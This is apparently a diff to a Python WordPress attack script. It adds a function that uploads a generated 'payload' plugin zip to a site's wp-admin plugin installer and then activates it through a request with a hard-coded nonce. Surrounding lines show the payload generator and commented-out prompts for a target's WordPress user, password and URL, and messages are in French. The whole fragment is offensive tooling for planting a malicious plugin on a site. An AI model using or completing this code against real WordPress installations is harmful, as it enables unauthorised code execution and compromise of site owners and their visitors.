@@ -43,10 +43,21 @@ def gen_plugin():
     return(f'[+] payload name: {zip}')
 
 
+def uplaod_plugins(url, zip_file):
+    files = zip_file
+    r = requests.post(f'{url}/wp-admin/plugin-install.php', files)
+
+    if r.status_code == 200:
+        print('[*] Plugin téléversé avec succès.')
+    else:
+        print(f'Erreur lors du téléversement du plugin. Code d\'état : {r.status_code}')
+
+    rr = requests.get(f'{url}/wp-admin/plugins.php?action=activate&plugin=payload-1%2Fplugins.php&_wpnonce=b0f3af346f')
+    print(rr.status_code)
+
 #user = input('enter wp user: ')
 #password = input('enter wp pass: ')
 #url = input('enter wp url: ')
-
 print(login_wp)
 gen = gen_plugin()
 print(gen)
